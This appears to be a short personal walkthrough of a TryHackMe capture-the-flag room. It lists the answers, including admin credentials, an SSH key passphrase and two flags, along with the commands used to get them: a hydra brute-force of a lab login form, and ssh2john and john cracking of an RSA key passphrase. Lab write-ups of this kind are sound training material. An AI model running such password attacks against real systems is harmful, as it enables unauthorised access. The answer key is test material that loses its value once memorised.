Find a form to get a shell on SSH.

Answer the questions below

| Question                                      | Answer       | SS                                   |
| --------------------------------------------- | ------------ | ------------------------------------ |
| What is the user:password of the admin panel? | admin:xavier | ![[Pasted image 20240316192814.png]] |
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.104.231 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid"
```
![[Pasted image 20240316192408.png]]


| Question                                                                     | Answer     | SS                                   |
| ---------------------------------------------------------------------------- | ---------- | ------------------------------------ |
| Crack the RSA key you found.  <br>What is John's RSA Private Key passphrase? | rockinroll | ![[Pasted image 20240316194852.png]] |
```
ssh2john RSA\ private\ key.txt > rsa
```

```
john rsa --wordlist=/usr/share/wordlists/rockyou.txt
```



| Question | Answer                           | SS                                   |
| -------- | -------------------------------- | ------------------------------------ |
| user.txt | THM{a_password_is_not_a_barrier} | ![[Pasted image 20240316200352.png]] |
```
ssh -i bruteit john@10.10.104.231
```



| Question | Answer                   | SS                                   |
| -------- | ------------------------ | ------------------------------------ |
| Web flag | THM{brut3_f0rce_is_e4sy} | ![[Pasted image 20240316202244.png]] |
